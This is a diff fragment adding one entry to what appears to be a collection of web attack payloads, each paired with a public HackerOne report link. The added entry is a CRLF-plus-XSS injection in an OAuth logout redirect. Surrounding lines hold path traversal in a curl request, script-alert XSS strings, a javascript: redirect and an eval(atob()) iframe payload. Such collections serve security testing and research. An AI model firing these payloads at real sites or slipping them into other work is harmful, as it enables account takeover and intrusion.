@@ -1134,6 +1134,7 @@ curl -X POST http://localhost:8082/predict/report_weakness_id -H 'content-type: 
 curl -X POST http://localhost:8082/predict/report_weakness_id -H 'content-type: application/json' -d'{"version":"v1/../../../..", "trained_at": "2023-01-01T00:00:00Z", "input": [{"title": "test xss", "num_of_top_predictions": 3}]}'	https://hackerone.com/reports/2032778
 <input type="hidden" name="apellido" value="<script>alert()</script>" />	https://hackerone.com/reports/2037234
 https://target.com/nin/success?message=lol&nin=<script	https://hackerone.com/reports/2039384
+https://█████/oauth/idp/logout?post_logout_redirect_uri=%0d%0a%0d%0a<script>alert(document.domain)</script>	https://hackerone.com/reports/2045549
 {"id":"4","activationDate":"<script>alert(1)</script>"}	https://hackerone.com/reports/2051085
 https://target.com/start/account/user?variationName=free&redirect_to=javascript:alert(document.domain	https://hackerone.com/reports/2055132
 "<iframe/onload=eval(atob(location.hash.substring(1)))>"@calc.sh	https://hackerone.com/reports/2089042
